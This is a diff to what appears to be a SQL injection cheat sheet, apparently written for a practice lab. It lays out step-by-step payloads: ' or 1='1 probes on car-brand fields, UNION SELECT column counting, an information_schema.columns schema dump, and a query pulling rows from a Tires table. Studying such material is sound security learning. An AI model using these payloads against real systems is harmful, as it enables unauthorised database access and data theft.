@@ -31,25 +31,24 @@ UNION SELECT table_schema,table_name,column_name FROM information_schema.columns
 _________________________________________________________________________________________________________________
 ## SQL Injection: 
 ### 1-Identify Vulnerable Field.
+#### The one that doesn't error out.
     Ford ' or 1='1
     Dodge ' or 1='1
     Honda ' or 1='1
     Audi ' or 1='1
 
-### 2-Modify Goldent Statement to include all information.
-#### UNION SELECT table_schema,table_name,column_name FROM information_schema.columns
+### 2-Identify number of columns.
+#### So you can find which fields need placeholders.
     Audi ' UNION SELECT 1,2,3,4 #
     Audi ' UNION SELECT 1,2,3,4,5 #
+    
+### 3-Modify Goldent Statement to include all information.
+#### UNION SELECT table_schema,table_name,column_name FROM information_schema.columns
     Audi ' UNION SELECT table_schema,2,table_name,column_name,5 FROM information_schema.columns #
 
-
-
-
-
-
-
-
-
+### 4-Craft the queries.
+#### Pulling custom user created data from the database.
+    Audi ' UNION SELECT tireid,2,name,size,cost FROM session.Tires #
 _________________________________________________________________________________________________________________
 
 
